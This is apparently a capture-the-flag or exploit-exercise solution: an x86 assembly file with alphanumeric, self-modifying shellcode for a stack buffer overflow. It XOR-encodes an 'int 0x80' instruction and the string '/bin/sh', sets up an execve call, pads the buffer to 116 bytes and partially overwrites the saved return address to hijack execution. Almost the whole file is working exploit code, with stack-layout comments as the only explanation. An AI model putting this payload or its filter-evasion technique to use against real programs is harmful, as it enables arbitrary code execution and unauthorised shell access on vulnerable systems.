; -70: buffer
; -0C: len
; -08
; -04
; 000: saved ebp
; +04: return address = 0x0800276A
; ------
; parsedvalue = 0x08003560
; 

; targetaddr = 0x08003560+0x00000023 = 0x8003583

bits 32
start:
	inc ecx ; skipped
	push 'aaaa'
	pop eax
	xor eax,'aaaa' ; eax = 0
	dec eax

	; edi <- eax = -1
	; ebx <- eax = -1
	push eax                         ;no change.
	push ecx                         ;no change.
	push edx                         ;no change.
	push eax                         ;ebx <- -1.
	push eax                         ;no change (ESP not "popped").
	push ebp                         ;no change.
	push esi                         ;no change.
	push eax                         ;edi <- -1
	popad
	
	; put xored int 0x80 instruction in edx
	; int 0x80 = 0xCD,0x80 = 0x80CD
	push 0x000080CD ^ 0xFFFF ^ 0x30303041 ;we push the value we want to invert.
	push esp                         ;we push the offset of the value we
                                     ; pushed on the stack.
	pop ecx                          ;ECX now contains this offset.
	xor WORD [ecx],di                ;we invert least significant two bytes of the value.
	pop edx                          ;we get it back in edx.

	; put target address in ecx
	push 0x80035BF ^ 0x41414130 ^ 0xFF
	push esp
	pop ecx
	xor BYTE [ecx],bh
	pop eax
	xor eax, 0x41414130
	push eax
	pop ecx
	
	inc ebx ; ebx = 0
	push ebx
	
	; 'n/sh' = 0x68732f6e
	push 0x68732f6e ^ 0x3030415a
	pop eax
	xor eax,0x3030415a
	push eax
	; '*/bi' = 0x69622f2a
	push 0x69622f2a ^ 0x30306141
	pop eax
	xor eax,0x30306141
	push eax
	
	push esp
	pop eax
	
	; esi <- edx = xored int 80h
	; eax <- ecx = target address of instruction to patch
	; ebx <- esp
	; ecx <- ebx = 0 (argv)
	; edx <- ebx = 0 (envp)
	push ecx                         ;eax <- ecx = target address
	push ebx                         ;ecx <- ebx = 0
	push ebx                         ;edx <- ebx = 0.
	push eax                         ;ebx <- eax = esp (before pushes)
	push eax                         ;no change (ESP not "popped").
	push ebp                         ;no change.
	push edx                         ;esi <- jmp instruction
	push edi                         ;no change.
	popad
	
	xor [eax],esi ; rewrite our target instruction
	
	inc ebx ; filename: ebx = esp+1
	push 0x0B ^ 0x41
	pop eax
	xor al,0x41
	
	
; target address: 0x08003560 + 0x5F = 0x80035BF
; this is going to be int 0x80
	dd 0x30303041
	
	; fill the rest of the buffer + unused stack space + saved ebp
	times 116-($-start) db '0'
	; return address is 0x0800279E
	; 0x08003561 - 0x08003560 = 1
	; overwrite least significant word with 0x3561, so return address is overwritten to 0x08003561
	dw 0x3561